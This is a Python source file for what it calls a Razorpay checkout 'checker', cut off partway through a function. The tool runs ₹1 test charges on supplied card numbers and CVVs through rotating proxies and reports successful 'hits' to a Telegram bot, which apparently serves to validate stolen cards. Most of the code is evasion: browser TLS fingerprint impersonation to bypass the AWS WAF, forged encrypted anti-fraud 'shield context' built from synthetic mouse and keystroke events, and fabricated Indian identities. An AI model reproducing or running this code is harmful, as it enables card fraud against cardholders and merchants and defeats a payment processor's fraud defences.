"""
Razorpay hosted checkout checker — Python port of r.php.
Uses curl_cffi for multi-platform browser TLS impersonation (bypasses AWS WAF).

Query: ?cc=number|mm|yyyy|cvv&site=https://razorpay.me/@handle&proxy=host:port:user:pass
Amount: 100 paise (₹1). Hits notified via Telegram (notify_charge).

Profiles: Chrome (Win/Mac/Linux/Android), Firefox (Win/Linux), Safari (macOS/iOS), Edge.
See profiles.py for the full multi-platform fingerprint diversity system.
"""

import re, json, time, random, hashlib, os, sys, base64, asyncio, threading, uuid
from urllib.parse import urlparse, quote, unquote
from dataclasses import dataclass, field
from typing import Optional
from concurrent.futures import ThreadPoolExecutor

from curl_cffi import requests as curl_requests, CurlOpt
from profiles import PlatformProfile, ProfileManager
from ja4_engine import JA4Config, DiversityEngine, get_diversity_engine
import tg_bot
import proxy_manager
import rate_limiter
from session_cache import SessionCache, get_session_cache

# ── primp backend (optional — falls back to curl_cffi-only if not installed) ─
try:
    import primp
    PRIMP_AVAILABLE = True
except ImportError:
    primp = None  # type: ignore
    PRIMP_AVAILABLE = False

# Dedicated thread pool for primp HTTP calls — the default pool has only
# min(32, cpu_count+4) threads (~28 on 24-core), which becomes a catastrophic
# bottleneck when 1000+ coroutines funnel primp calls through run_in_executor.
_PRIMP_EXECUTOR: Optional[ThreadPoolExecutor] = None


def _get_primp_executor() -> ThreadPoolExecutor:
    global _PRIMP_EXECUTOR
    if _PRIMP_EXECUTOR is None:
        import os as _os
        max_w = min(500, int(_os.environ.get('PRIMP_THREADS', '200')))
        _PRIMP_EXECUTOR = ThreadPoolExecutor(max_workers=max_w)
    return _PRIMP_EXECUTOR

# ── Constants ──────────────────────────────────────────────────────────────
DEFAULT_AMOUNT_PAISE = 100  # ₹1.00 fallback if no custom amount provided

# ── Runtime config (config.json — edit on disk, takes effect without restart) ──
_CONFIG_PATH = os.path.join(os.path.dirname(os.path.abspath(__file__)), 'config.json')
_config_cache = {"ts": 0.0, "data": {}}


def load_config() -> dict:
    """Read config.json with a 10s TTL cache so edits apply live."""
    global _config_cache
    now = time.time()
    if now - _config_cache["ts"] < 10.0:
        return _config_cache["data"]
    data = {}
    try:
        with open(_CONFIG_PATH, encoding="utf-8") as f:
            data = json.load(f)
    except Exception:
        data = {}
    _config_cache = {"ts": now, "data": data}
    return data


def tm_warm_enabled() -> bool:
    """TM browser warm-up gate — 1/0 in config.json."""
    return bool(int(load_config().get("TM_WARM_ENABLED", 0)))
CHECKOUT_JS_URL = 'https://checkout.razorpay.com/v1/checkout.js'
CHECKOUT_PUBLIC = 'https://api.razorpay.com/v1/checkout/public'
API_BASE = 'https://api.razorpay.com'
CB_FLOWS = 'https://api.razorpay.com/payments_cross_border_live/v1/checkout/cb_flows'
PREFERENCES_URL = 'https://api.razorpay.com/v2/standard_checkout/preferences'
PAYMENT_CREATE = 'https://api.razorpay.com/v1/standard_checkout/payments/create/ajax'
LUMBERJACK_URL = 'https://lumberjack.razorpay.com/v1/track'
LUMBERJACK_KEY = 'ZmY5N2M0YzVkN2JiYzkyMWM1ZmVmYWJk'

BASE62_ALPHABET = '0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz'

FIRST_NAMES = ['john', 'alex', 'sam', 'mike', 'david', 'rahul', 'amit', 'priya', 'neha', 'rohan']


# ── Human-like timing ──────────────────────────────────────────────────────
def _human_delay(median_ms: float = 150, sigma: float = 0.3) -> float:
    """Lightweight delay for high-concurrency checkouts.
    median_ms: center of distribution (150ms = minimal human gap)
    sigma: spread (0.3 = tight jitter)
    Returns delay in seconds, clamped to [0.05, 2.0]."""
    mu = __import__('math').log(median_ms / 1000.0)
    delay_sec = random.lognormvariate(mu, sigma)
    return max(0.05, min(delay_sec, 2.0))


# ── Helpers ────────────────────────────────────────────────────────────────
def _base62(n: int) -> str:
    if n == 0:
        return '0'
    out = []
    while n > 0:
        out.append(BASE62_ALPHABET[n % 62])
        n //= 62
    return ''.join(reversed(out))


def _safe_get(d: dict, *keys, default=''):
    for k in keys:
        if isinstance(d, dict) and k in d:
            d = d[k]
        else:
            return default
    return d


# ── Browser Profile (multi-platform via profiles.py) ──────────────────────
# The old generate_browser_profile() is replaced by ProfileManager.
# Each profile ensures TLS target, User-Agent, sec-ch-ua, platform, screen
# metrics, and locale are all internally consistent for one specific
# browser + OS combination.
#
# Quick access:
#   pm = get_profile_manager()
#   profile = pm.pick_weighted()        # 70% Chrome, 15% Firefox, 10% Safari, 5% Edge
#   profile = pm.pick_by_category('desktop')
#   profile = pm.pick_by_category('mobile')
#
# The .as_profile_dict() method returns the dict format used internally.


def generate_checkout_id() -> str:
    epoch_offset = int(round(time.time() * 1000)) - 1388534400000
    rand6 = str(random.randint(0, 999999)).zfill(6)
    num_str = str(epoch_offset) + rand6
    rand2 = int(238328 * random.random())
    t = _base62(int(num_str)) + _base62(rand2) + '0'
    alpha_map = {c: i for i, c in enumerate(BASE62_ALPHABET)}
    total = 0
    length = len(t)
    for o in range(length):
        ch = t[length - 1 - o]
        e = alpha_map.get(ch, 0)
        if (length - o) % 2 == 1:
            e *= 2
        if e >= 62:
            e = (e % 62) + 1
        total += e
    check = total % 62
    if check != 0:
        check = 62 - check
    return t[:13] + BASE62_ALPHABET[check]


def generate_device_id(profile: dict) -> str:
    p = profile
    w, h = int(p['screen_width']), int(p['screen_height'])
    parts = [
        p['user_agent'], p['language'], p['timezone_offset'],
        p['platform'], '', p['hardware_concurrency'],
        p['color_depth'], p['device_memory'],
        str(w + h), str(w * h), p['device_pixel_ratio'],
    ]
    hx = hashlib.sha1(','.join(parts).encode()).hexdigest()  # real browser: s.join() = comma-join
    ts = int(round(time.time() * 1000))
    rand8 = str(random.randint(10000000, 99999999))
    return f"1.{hx}.{ts}.{rand8}"

# ── Shield context forge ────────────────────────────────────────────────
# Reverse-engineered from v2-entry-a22a774c.modern.js module 96192 (activityRecorder).
# _[shield_context] = "1-" + shield_context + "--" + base64(epk || nonce || nacl.box(behavioral, nonce, shield_key_pub, epk_sk))
# shield_key from /v2/standard_checkout/preferences is an X25519 PUBLIC key (b64, 32B).
def forge_shield_context(shield_key_b64: str, shield_context: str, device: dict | None = None) -> str:
    """Build a server-valid _[shield_context] for creat/ajax. Forgeable with just the preferences data."""
    try:
        from nacl.public import PrivateKey, PublicKey, Box
        from nacl.utils import random as _nacl_random
    except Exception:
        # no pynacl -> fall back to the raw context (will likely 403; just don't crash)
        return "1-" + shield_context + "--"
    try:
        pk = PublicKey(base64.b64decode(shield_key_b64))
    except Exception:
        return "1-" + shield_context + "--"
    epk = PrivateKey.generate()
    nonce = _nacl_random(24)
    behavioral = {
        "v": 2,
        "d": random.randint(300, 2500),           # duration ms (mouse->pay)
        "e": _fake_behavioral_events(),
        "c": {},
        "g": _shield_device_info(device),
        "a": 1,
    }
    for ev in behavioral["e"]:
        t = ev.get("t", "mousemove")
        behavioral["c"][t] = behavioral["c"].get(t, 0) + 1
    box = Box(epk, pk)
    ct = box.encrypt(json.dumps(behavioral).encode(), nonce)
    boxed = bytes(epk.public_key) + nonce + ct.ciphertext
    return "1-" + shield_context + "--" + base64.b64encode(boxed).decode()


def _fake_behavioral_events() -> list:
    """Synthetic human-like mousemove/click/keyup/input events.

    Mimics real cursor physics: accelerated start, decelerated approach to a
    target, micro-pauses (hesitation), then a click, then typing with natural
    rhythm (fast bursts separated by pauses)."""
    evs = []
    t = random.randint(120, 400)  # initial settle delay

    def mousemove(x, y, ts):
        evs.append({"t": "mousemove", "s": ts, "x": int(x), "y": int(y)})

    # 1) mouse path: start -> hover near card number -> hover cvv (with drift)
    sx, sy = random.randint(80, 400), random.randint(60, 300)
    mousemove(sx, sy, t)
    targets = [
        (random.randint(420, 720), random.randint(240, 420)),   # card number field
        (random.randint(700, 900), random.randint(240, 420)),   # expiry/cvv
        (random.randint(500, 900), random.randint(420, 560)),   # cvv
    ]
    for tx, ty in targets:
        cx, cy = sx, sy
        dist = max(1, ((tx - cx) ** 2 + (ty - cy) ** 2) ** 0.5)
        steps = random.randint(int(dist / 6), int(dist / 2))
        for k in range(steps):
            # easing: fast start, slow approach
            progress = (k + 1) / steps
            ease = 1 - (1 - progress) ** 2  # ease-out
            nx = cx + (tx - cx) * ease + random.uniform(-6, 6)   # jitter
            ny = cy + (ty - cy) * ease + random.uniform(-4, 4)
            t += random.randint(6, 22)   # fast movement
            mousemove(nx, ny, t)
            # occasional hesitation micro-pause
            if random.random() < 0.08:
                t += random.randint(80, 260)
        cx, cy = tx, ty
        sx, sy = cx, cy
        # pause at field before continuing
        t += random.randint(150, 520)

    # 2) click on the card-number field (button 0) after a beat
    t += random.randint(120, 380)
    evs.append({"t": "click", "s": t, "x": int(sx), "y": int(sy), "b": 0})

    # 3) typing: card number (16 digits) in groups with natural rhythm
    digits = [random.randint(48, 57) for _ in range(16)]
    for idx, n in enumerate(digits):
        t += random.randint(60, 160)   # keystroke gap
        evs.append({"t": "keyup", "s": t, "n": n})
        if idx in (3, 7, 11):
            t += random.randint(180, 420)   # pause between digit groups

    # 4) tab / field switch -> cvv typing (3-4 digits)
    t += random.randint(200, 600)
    for _ in range(random.randint(3, 4)):
        t += random.randint(80, 200)
        evs.append({"t": "keyup", "s": t, "n": random.randint(48, 57)})

    # 5) input events (autofill/paste) + a final scroll
    t += random.randint(150, 450)
    evs.append({"t": "input", "s": t, "i": str(random.randint(10**15, 10**16 - 1))})
    t += random.randint(80, 260)
    evs.append({"t": "input", "s": t, "i": str(random.randint(100, 999))})

    return evs


def _shield_device_info(profile: dict | None = None) -> dict:
    """Build the device-info (g) block from the browser profile so it matches
    the fhash/rzp_device_id (the SHA-1 is computed from the same values)."""
    p = profile or {}
    def _i(key, default):
        try:
            return int(float(p.get(key, default)))
        except Exception:
            return default
    w = _i('screen_width', 1920)
    h = _i('screen_height', 1080)
    dm = None
    try:
        dm = int(p.get('device_memory', 8) or 0) or None
    except Exception:
        dm = None
    return {
        "cp": {"mt": 0, "te": False, "pc": 0, "pf": 0, "ap": 0, "hv": 0, "ah": 0},
        "sc": {"w": w, "h": h, "cd": _i('color_depth', 24), "pr": _i('device_pixel_ratio', 1)},
        "vp": {"w": w, "h": h},
        "tz": "Asia/Kolkata",
        "to": _i('timezone_offset', -330),
        "lg": p.get('language', 'en-IN'),
        "ls": [p.get('language', 'en-IN'), "en", "hi"],
        "lc": 3,
        "ce": True,
        "dn": None,
        "hc": _i('hardware_concurrency', 8),
        "dm": dm,
        "au": {"wd": False, "pn": 0, "ch": True, "nt": False, "wv": None, "wr": None},
    }



def generate_indian_mobile() -> str:
    return '+91' + str(random.randint(6, 9)) + ''.join(str(random.randint(0, 9)) for _ in range(9))


def generate_email() -> str:
    return f"{random.choice(FIRST_NAMES)}{random.randint(100, 9999)}@gmail.com".lower()


# ── Indian address generator (bharataddress — 26,711 real pincodes) ──────
_ADDRESS_CACHE: list[dict] = []
_ADDRESS_LOADED = False


def _load_addresses():
    """Load pincode data once — thread-safe lazy init."""
    global _ADDRESS_CACHE, _ADDRESS_LOADED
    if _ADDRESS_LOADED:
        return
    try:
        import json as _json, os as _os
        pkg_dir = '/home/zirconium/.local/lib/python3.14/site-packages/bharataddress/data'
        with open(_os.path.join(pkg_dir, 'pincodes.json')) as f:
            data = _json.load(f)
        _ADDRESS_CACHE = list(data.values())
        _ADDRESS_LOADED = True
    except Exception:
        _ADDRESS_LOADED = True  # don't retry on failure


def generate_indian_address() -> dict:
    """Return a random real Indian address with matched pincode/city/state.
    Falls back to hardcoded Delhi if bharataddress is unavailable."""
    _load_addresses()
    if _ADDRESS_CACHE:
        street_names = ['Main', 'Park', 'MG', 'Station', 'Church', 'Temple',
                        'Market', 'Gandhi', 'Nehru', 'Patel', 'Shivaji', 'Tagore']
        p = random.choice(_ADDRESS_CACHE)
        return {
            'country': 'IN',
            'postal_code': p['pincode'],
            'city': p['city'],
            'state': p['state'],
            'line1': f"{random.randint(1, 200)}, {random.choice(street_names)} Road",
            'line2': '',
        }
    # Fallback
    return {
        'country': 'IN', 'postal_code': '110001', 'city': 'New Delhi',
        'state': 'Delhi', 'line1': '123 Main Street', 'line2': '',
    }


# ── Main Session ───────────────────────────────────────────────────────────
class RazorpaySession:
    """Full Razorpay checkout flow using curl_cffi for Chrome TLS."""

    def __init__(self, payment_page_url: str, card: dict, proxy: Optional[str] = None,
                 traffic_env: str = 'canary', order_comment: str = '', verbose: bool = False,
                 amount_paise: int = DEFAULT_AMOUNT_PAISE,
                 browser_profile: Optional[PlatformProfile] = None,
                 region: str = 'IN',
                 ja4_config: Optional[JA4Config] = None,
                 session_cache: Optional[SessionCache] = None,
                 per_request_timeout: float = 20.0):
        self.payment_page_url = self._normalize_url(payment_page_url)
        self.payment_referer = self.payment_page_url
        self.card = card
        self.proxy = proxy
        self.traffic_env = traffic_env
        self.order_comment = order_comment
        self.verbose = verbose
        self.amount_paise = min(10000, max(100, amount_paise))  # ₹1.00..₹100 cap (Razorpay min ₹1.00)
        self._per_request_timeout = per_request_timeout  # configurable per-HTTP-request timeout

        # Multi-platform browser profile: TLS target + headers + device metrics
        # all internally consistent for one specific browser/OS combination.
        if browser_profile is not None:
            self._browser_profile = browser_profile
        else:
            mgr = ProfileManager(region=region)
            # All 10 profiles are Chrome — Firefox/Safari/Edge all get 403'd
            # by Razorpay WAF.  Weighted random pick across Windows/macOS/Linux.
            self._browser_profile = mgr.pick()
        self._impersonation_target = self._browser_profile.impersonate_target
        # Legacy dict for generate_device_id() and other internals
        self.profile = self._browser_profile.to_legacy_dict()
        # JA4 diversity: unique TLS fingerprint per checkout session
        self._ja4_config = ja4_config
        self._session_cache = session_cache
        self.tokens: dict = {}

        # Parse proxy into components so we can pass proxy + proxy_auth
        # per-request, which reliably sets CURLOPT_PROXYUSERPWD for CONNECT
        # tunnels.  The session.proxies dict alone often fails to forward
        # embedded user:pass to libcurl, producing HTTP 407 from the proxy.
        self._proxy_url: Optional[str] = None       # http://host:port (no auth)
        self._proxy_auth: Optional[tuple] = None     # (user, pass) or None
        if self.proxy:
            p = urlparse(self.proxy)
            port = p.port or (443 if p.scheme == 'https' else 3128)
            self._proxy_url = f'{p.scheme}://{p.hostname}:{port}'
            if p.username and p.password:
                self._proxy_auth = (unquote(p.username), unquote(p.password))

        self.session = self._create_session()
        self._no_proxy_session = None  # lazy-cached in _session_no_proxy()
        self._async_session: Optional[curl_requests.AsyncSession] = None  # lazy init in run_async()
        self._async_no_proxy_sess = None
        self.forced_outcome: Optional[dict] = None
        self.last_http_code: int = 0

    # ── URL helpers ────────────────────────────────────────────────────────
    @staticmethod
    def _normalize_url(site: str) -> str:
        site = site.strip().rstrip('/')
        if not site:
            return 'https://razorpay.me/@tpstech'
        if not site.startswith('http'):
            if site.startswith('@'):
                site = 'https://razorpay.me/' + site
            elif 'pages.razorpay.com' in site or 'razorpay.me' in site or 'razorpay.com' in site:
                site = 'https://' + site.lstrip('/')
            else:
                site = 'https://razorpay.me/@' + site.lstrip('@')
        return site

    def _host(self) -> str:
        return urlparse(self.payment_page_url).hostname or 'razorpay.me'

    def _payment_page_origin(self) -> str:
        return f'https://{self._host()}'

    def _short_url(self, url: str) -> str:
        parts = urlparse(url)
        q = ('?' + parts.query[:40] + '…') if parts.query else ''
        return (parts.hostname or '') + (parts.path or '/') + q

    def _order_currency(self) -> str:
        return str(self.tokens.get('currency', 'INR')).upper()

    # ── Session ────────────────────────────────────────────────────────────
    # Each Chrome version ships with a different GREASE brand (intentional
    # variation to prevent servers from hardcoding User-Agent rejection rules).
    # A fake-brand mismatch with the Chrome version is a detectable bot signal.
    # Source: Chrome source code (components/embedder_support/user_agent_utils.cc)
    _FAKE_BRAND_MAP: dict[str, tuple[str, str]] = {
        "110": ('"Not A(Brand"', "24"),
        "116": ('"Not)A;Brand"', "24"),
        "120": ('"Not_A Brand"', "8"),
        "124": ('"Not-A.Brand"', "99"),
        "131": ('"Not_A Brand"', "24"),
        "133": ('"Not:A-Brand"', "99"),
        "136": ('"Not.A/Brand"', "99"),
        "142": ('"Not_A Brand"', "24"),
        "145": ('"Not/A)Brand"', "99"),
        "146": ('"Not/A)Brand"', "99"),
    }

    # curl_cffi 0.16.3 target → OS (from curl_cffi/fingerprints.py).
    # The TLS ClientHello OS is fixed by the impersonation target, so the HTTP
    # UA + sec-ch-ua-platform MUST match that OS or the WAF flags the mismatch.
    _WINDOWS_TARGETS = frozenset((
        "chrome99", "chrome100", "chrome101", "chrome104", "chrome107",
        "chrome110", "chrome116"))
    _MACOS_TARGETS = frozenset((
        "chrome119", "chrome120", "chrome123", "chrome124", "chrome131",
        "chrome133a", "chrome136", "chrome142", "chrome145", "chrome146",
        "chrome150"))
    _ANDROID_TARGETS = frozenset(("chrome99_android", "chrome131_android"))

    @staticmethod
    def _chrome_headers_for_target(target: str) -> dict:
        """User-Agent + sec-ch-ua + platform for curl_cffi's ACTUAL target OS.

        One target -> one fixed UA (same rule as the Shopify PROFILE_UA map):
        the impersonation target sets both the TLS ClientHello AND the OS, so
        the headers must match it exactly — no random fallback, no cross-OS UA.
        """
        m = re.search(r'chrome(\d+)', target or '')
        major = m.group(1) if m else '124'
        fake_brand, fake_ver = RazorpaySession._FAKE_BRAND_MAP.get(
            major, ('"Not/A)Brand"', "99"))
        if target in RazorpaySession._MACOS_TARGETS:
            ua = (f'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) '
                  f'AppleWebKit/537.36 (KHTML, like Gecko) '
                  f'Chrome/{major}.0.0.0 Safari/537.36')
            platform = '"macOS"'
        elif target in RazorpaySession._ANDROID_TARGETS:
            dev = 'Pixel 6' if major == '99' else 'Pixel 8'
            ua = (f'Mozilla/5.0 (Linux; Android 12; {dev}) '
                  f'AppleWebKit/537.36 (KHTML, like Gecko) '
                  f'Chrome/{major}.0.0.0 Mobile Safari/537.36') if major == '99' else \
                 (f'Mozilla/5.0 (Linux; Android 14; {dev}) '
                  f'AppleWebKit/537.36 (KHTML, like Gecko) '
                  f'Chrome/{major}.0.0.0 Mobile Safari/537.36')
            platform = '"Android"'
        else:  # Windows
            ua = (f'Mozilla/5.0 (Windows NT 10.0; Win64; x64) '
                  f'AppleWebKit/537.36 (KHTML, like Gecko) '
                  f'Chrome/{major}.0.0.0 Safari/537.36')
            platform = '"Windows"'
        return {
            'User-Agent': ua,
            'sec-ch-ua': (f'"Chromium";v="{major}", '
                          f'"Google Chrome";v="{major}", '
                          f'{fake_brand};v="{fake_ver}"'),
            'sec-ch-ua-mobile': '?1' if target in RazorpaySession._ANDROID_TARGETS else '?0',
            'sec-ch-ua-platform': platform,
        }

    @staticmethod
    def _agent_fields(target: str) -> dict:
        """_[agent][platform|device|os] — the agent-detection fields checkout.js
        sends in payment_create (from navigator.platform/userAgent).  Added by
        Razorpay's 2026 checkout build; required to pass the WAF.

        checkout.js module 2606:
          os       = iPhone|iPad -> "iOS" | Android -> "android" | Windows NT -> "windows"
                     | Linux -> "linux" | Mac OS -> "macOS" | else "other"
          device   = iPhone -> "iPhone" | iPad -> "iPad" | Android -> "android"
                     | small-screen -> "mobile" | else "desktop"
          platform = navigator.platform ("Win32" | "MacIntel" | "Linux armv8l")
        """
        if target in RazorpaySession._ANDROID_TARGETS:
            return {'_[agent][platform]': 'Linux armv8l',
                    '_[agent][device]': 'android',
                    '_[agent][os]': 'android'}
        if target in RazorpaySession._MACOS_TARGETS:
            return {'_[agent][platform]': 'MacIntel',
                    '_[agent][device]': 'desktop',
                    '_[agent][os]': 'macOS'}
        return {'_[agent][platform]': 'Win32',
                '_[agent][device]': 'desktop',
                '_[agent][os]': 'windows'}

    def _create_session(self) -> curl_requests.Session:
        """Create the proxy session with browser TLS impersonation + JA4 diversity."""
        # JA4 config's impersonate target takes priority (provides JA4 hash rotation).
        # Falls back to browser profile's target for header/TLS consistency.
        target = (self._ja4_config.impersonate_target if self._ja4_config is not None
                  else self._impersonation_target)
        kwargs: dict = {
            'impersonate': target,
            'default_headers': True,
            'verify': False,  # proxy MITM self-signed certs (curl error 60) — skip cert verification
            # ECH GREASE (TLS extension 65037) — real Chrome 119+ always sends
            # this extension.  Its ABSENCE is a detectable anomaly that WAFs
            # can use to distinguish impersonated traffic from real browsers.
            'curl_options': {CurlOpt.ECH: "grease"},
        }
        # Inject JA4 diversity config for unique TLS fingerprint per session
        if self._ja4_config is not None:
            kwargs['extra_fp'] = self._ja4_config.to_dict()
        if self._proxy_url:
            kwargs['proxy'] = self._proxy_url
            if self._proxy_auth:
                kwargs['proxy_auth'] = self._proxy_auth

        s = curl_requests.Session(**kwargs)
        # Use profile.headers() — but sync UA/sec-ch-ua with JA4 target
        # if the target version differs from the profile version
        headers = dict(self._browser_profile.headers())
        # Always sync UA/sec-ch-ua/platform to the impersonation target's OS.
        headers.update(self._chrome_headers_for_target(target))
        s.headers.update(headers)
        return s

    @staticmethod
    def _extract_chrome_version(target: str) -> str:
        """Extract major version from curl_cffi impersonation target name.
        'chrome124' → '124', 'chrome133a' → '133', 'chrome145' → '145'."""
        import re
        m = re.search(r'chrome(\d+)', target)
        return m.group(1) if m else ''

    def _request(self, method: str, url: str, extra_headers: dict = None,
                 data=None, json_data=None, use_proxy: bool = True, raw: bool = False):
        """Make an HTTP request. use_proxy=False bypasses proxy for payment-create."""
        headers = {}
        if extra_headers:
            headers.update(extra_headers)

        s = self.session if use_proxy else self._session_no_proxy()

        t0 = time.time()
        # Pop Content-Type once (curl_cffi sets it itself via json=).
        if json_data is not None:
            headers.pop('Content-Type', None)
            headers.pop('Content-type', None)

        # curl retry — transient SSL/timeout/connection errors retry 2x before giving up.
        for _attempt in range(3):
            try:
                if method == 'GET':
                    resp = s.get(url, headers=headers, timeout=self._per_request_timeout)
                elif json_data is not None:
                    resp = s.request(method, url, json=json_data, headers=headers, timeout=self._per_request_timeout)
                elif data is not None:
                    resp = s.request(method, url, data=data, headers=headers, timeout=self._per_request_timeout)
                else:
                    resp = s.request(method, url, headers=headers, timeout=self._per_request_timeout)
                break
            except Exception as _e:
                if _attempt < 2:
                    time.sleep(0.5 * (_attempt + 1))
                    continue
                raise

        self.last_http_code = resp.status_code
        if getattr(self, '_response_log', None) is not None:
            try:
                req_payload = json_data if json_data is not None else data
                try:
                    req_snapshot = (req_payload[:2000] if isinstance(req_payload, (str, bytes)) else json.dumps(req_payload)[:2000])
                except Exception:
                    req_snapshot = str(req_payload)[:2000]
                self._response_log.append({
                    'method': method, 'url': url, 'status': resp.status_code,
                    'req': req_snapshot,
                    'headers': dict(resp.headers),
                    'body': (resp.text or '')[:4000],
                    'timing_ms': round((time.time() - t0) * 1000, 1),
                    'ts': round(time.time(), 3),
                })
            except Exception:
                pass
        if self.verbose:
            print(f'HTTP {resp.status_code} ← {self._short_url(url)} ({len(resp.content)} bytes) [{time.time()-t0:.1f}s]')

        if raw:
            return resp
        if resp.status_code >= 400:
            waf_action = resp.headers.get('x-amzn-waf-action', 'none')
            request_id = resp.headers.get('x-amzn-RequestId', 'none')
            body_preview = (resp.text or '(empty)')[:1000]
            print(f'\n[WAF_DIAG] HTTP {resp.status_code} | waf={waf_action} | reqid={request_id}'
                  f'\n[WAF_DIAG] URL: {self._short_url(url)}'
                  f'\n[WAF_DIAG] BODY: {body_preview}', file=sys.stderr)
            # Try classification before raising raw error
            outcome = self._outcome_from_api_error(resp.status_code, resp.text)
            if outcome:
                raise RuntimeError(f"{outcome['status']}|{outcome['reason']}|{outcome['message']}")
            raise RuntimeError(f'HTTP {resp.status_code} for {url}: {resp.text[:500]}')
        return resp.text

    async def _request_async(self, method: str, url: str, extra_headers: dict = None,
                             data=None, json_data=None, use_proxy: bool = True, raw: bool = False):
        """Async version of _request using curl_cffi AsyncSession."""
        headers = {}
        if extra_headers:
            headers.update(extra_headers)

        s = self._async_session if use_proxy else await self._async_no_proxy_session()

        t0 = time.time()
        if method == 'GET':
            resp = await s.get(url, headers=headers, timeout=self._per_request_timeout)
        elif json_data is not None:
            headers.pop('Content-Type', None)
            headers.pop('Content-type', None)
            resp = await s.request(method, url, json=json_data, headers=headers, timeout=self._per_request_timeout)
        elif data is not None:
            resp = await s.request(method, url, data=data, headers=headers, timeout=self._per_request_timeout)
        else:
            resp = await s.request(method, url, headers=headers, timeout=self._per_request_timeout)

        self.last_http_code = resp.status_code
        if getattr(self, '_response_log', None) is not None:
            try:
                req_payload = json_data if json_data is not None else data
                try:
                    req_snapshot = (req_payload[:2000] if isinstance(req_payload, (str, bytes)) else json.dumps(req_payload)[:2000])
                except Exception:
                    req_snapshot = str(req_payload)[:2000]
                self._response_log.append({
                    'method': method, 'url': url, 'status': resp.status_code,
                    'req': req_snapshot,
                    'headers': dict(resp.headers),
                    'body': (resp.text or '')[:4000],
                    'timing_ms': round((time.time() - t0) * 1000, 1),
                    'ts': round(time.time(), 3),
                })
            except Exception:
                pass
        if self.verbose:
            print(f'HTTP {resp.status_code} ← {self._short_url(url)} ({len(resp.content)} bytes) [{time.time()-t0:.1f}s]')

        if raw:
            return resp
        if resp.status_code >= 400:
            waf_action = resp.headers.get('x-amzn-waf-action', 'none')
            request_id = resp.headers.get('x-amzn-RequestId', 'none')
            body_preview = (resp.text or '(empty)')[:1000]
            print(f'\n[WAF_DIAG] HTTP {resp.status_code} | waf={waf_action} | reqid={request_id}'
                  f'\n[WAF_DIAG] URL: {self._short_url(url)}'
                  f'\n[WAF_DIAG] BODY: {body_preview}', file=sys.stderr)
            outcome = self._outcome_from_api_error(resp.status_code, resp.text)
            if outcome:
                raise RuntimeError(f"{outcome['status']}|{outcome['reason']}|{outcome['message']}")
            raise RuntimeError(f'HTTP {resp.status_code} for {url}: {resp.text[:500]}')
        return resp.text

    def _create_async_session(self) -> curl_requests.AsyncSession:
        """Create the async proxy session with JA4 diversity."""
        # JA4 config's impersonate target takes priority for JA4 hash rotation.
        target = (self._ja4_config.impersonate_target if self._ja4_config is not None
                  else self._impersonation_target)
        kwargs: dict = {
            'impersonate': target,
            'default_headers': True,
            'verify': False,
            'max_clients': 1,  # sequential sub-requests within a checkout
            'curl_options': {CurlOpt.ECH: "grease"},
        }
        # Inject JA4 diversity config for unique TLS fingerprint per session
        if self._ja4_config is not None:
            kwargs['extra_fp'] = self._ja4_config.to_dict()
        if self._proxy_url:
            kwargs['proxy'] = self._proxy_url
            if self._proxy_auth:
                kwargs['proxy_auth'] = self._proxy_auth

        s = curl_requests.AsyncSession(**kwargs)
        # Always sync UA/sec-ch-ua/platform to the impersonation target's OS.
        headers = dict(self._browser_profile.headers())
        headers.update(self._chrome_headers_for_target(target))
        s.headers.update(headers)
        return s

    async def _async_no_proxy_session(self):
        if self._async_no_proxy_sess is not None:
            return self._async_no_proxy_sess
        target = (self._ja4_config.impersonate_target if self._ja4_config is not None
                  else self._impersonation_target)
        kwargs = dict(impersonate=target, default_headers=True, verify=False,
                      max_clients=1, curl_options={CurlOpt.ECH: "grease"})
        if self._ja4_config is not None:
            kwargs['extra_fp'] = self._ja4_config.to_dict()
        s = curl_requests.AsyncSession(**kwargs)
        s.headers.update(self._browser_profile.headers())
        self._async_no_proxy_sess = s
        return s

    def _session_no_proxy(self):
        """Create / return a cached session without proxy."""
        if self._no_proxy_session is not None:
            return self._no_proxy_session
        target = (self._ja4_config.impersonate_target if self._ja4_config is not None
                  else self._impersonation_target)
        kwargs = dict(impersonate=target, default_headers=True, verify=False)
        if self._ja4_config is not None:
            kwargs['extra_fp'] = self._ja4_config.to_dict()
        s = curl_requests.Session(**kwargs)
        s.headers.update(self._browser_profile.headers())
        self._no_proxy_session = s
        return s

    # ── Session cleanup ───────────────────────────────────────────────────
    def close(self):
        """Close all sync curl sessions to release FDs and libcurl handles."""
        for attr in ('session', '_no_proxy_session'):
            sess = getattr(self, attr, None)
            if sess is not None:
                try:
                    sess.close()
                except Exception:
                    pass
            setattr(self, attr, None)

    async def aclose(self):
        """Close all async curl sessions to release FDs and libcurl handles."""
        for attr in ('_async_session', '_async_no_proxy_sess'):
            sess = getattr(self, attr, None)
            if sess is not None:
                try:
                    await sess.close()
                except Exception:
                    pass
            setattr(self, attr, None)
        # Also close sync sessions (belt and suspenders)
        self.close()

    # ── ID generation ──────────────────────────────────────────────────────
    def _generate_ids(self):
        cid = generate_checkout_id()
        self.tokens['checkout_id'] = cid
        self.tokens['unified_session_id'] = cid
        self.tokens['rzp_device_id'] = self._browser_profile.generate_device_id()
        # Mirror PHP persistUnifiedSessionId — set cookie on payment page domain
        payment_host = self._host()
        self.session.cookies.set('rzp_unified_session_id', cid, domain=payment_host, path='/')

    def _rtb_device_id(self) -> str:
        parts = (self.tokens.get('rzp_device_id', '')).split('.')
        return parts[1] if len(parts) > 1 else ''

    def _forged_shield_context(self) -> str:
        """Return the server-valid _[shield_context] (encrypted behavioral blob)."""
        if not self.tokens.get('_forged_shield'):
            ctx = self.tokens.get('shield_context', '')
            key = self.tokens.get('shield_key', '')
            self.tokens['_forged_shield'] = forge_shield_context(key, ctx, getattr(self, 'profile', None)) if (key and ctx) else ctx
        return self.tokens['_forged_shield']

    def _generate_stripe_radar_session(self) -> str:
        """Call the REAL Stripe Radar API to get a fraud verification token.
        Real browser calls api.stripe.com/v1/radar/session via Stripe.js.
        We replicate the exact request format using Razorpay's publishable key.
        Returns the radar session ID (rse_...) or empty string on failure."""
        for attempt in range(3):
            try:
                stripe_key = 'pk_live_51TEUe0H2XZ8dfO2Alxvxqs30mAHQ2LNfDgdAyAAphuIpllC68rcBLEBHQhb5SqHpuJIJ78nANCVABkN14vmujyhb00kPQBMvHP'
                muid = str(uuid.uuid4()).replace('-', '')[:32]
                sid_param = uuid.uuid4().hex[:30]
                body = (
                    f'guid={uuid.uuid4().hex}{uuid.uuid4().hex[:6]}'
                    f'&muid={muid}'
